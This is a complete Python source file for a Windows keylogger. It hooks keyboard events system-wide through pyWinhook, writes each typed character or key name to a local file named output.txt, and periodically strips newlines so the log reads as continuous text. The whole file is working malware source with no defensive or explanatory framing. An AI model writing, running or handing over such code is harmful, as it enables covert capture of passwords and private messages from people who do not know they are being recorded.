import atexit
import logging

import pythoncom
import pyWinhook

log_file = 'output.txt'
counter = 0


def strip_newlines():
    with open(log_file, 'r') as r:
        text = r.read()
        r.close()
    text = text.replace('\n', '')
    with open(log_file, 'w') as w:
        w.truncate()
        w.write(text)
        w.close()


def keystroke(event):
    global counter
    if counter >= 30:
        strip_newlines()
        counter = 0
    counter += 1
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')

    if event.Ascii > 32 and event.Ascii < 127:
        logging.log(10, chr(event.Ascii))

    else:
        logging.log(10, f' {event.Key} ')

    return True


atexit.register(strip_newlines)
hm = pyWinhook.HookManager()
hm.KeyDown = keystroke
hm.HookKeyboard()
pythoncom.PumpMessages()
